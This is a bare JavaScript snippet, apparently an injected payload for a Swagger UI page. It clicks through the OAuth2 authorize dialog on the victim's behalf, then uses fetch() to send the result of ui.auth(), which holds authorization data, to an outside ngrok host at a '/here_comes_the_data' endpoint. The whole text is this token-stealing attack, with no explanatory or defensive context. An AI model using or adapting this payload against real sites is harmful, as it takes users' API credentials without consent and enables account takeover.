document.querySelector("button.authorize").click();
setTimeout(() => {
  document.querySelector("input#public_profile-implicit-checkbox-OAuth2").checked = true;
  setTimeout(() => {
    document.querySelector("button.modal-btn.authorize").click(); 

    setTimeout(() => {
      fetch("https://somehost.eu.ngrok.io/here_comes_the_data?data=" + encodeURIComponent(JSON.stringify(ui.auth())));
    }, 2500);
  }, 100);
}, 100);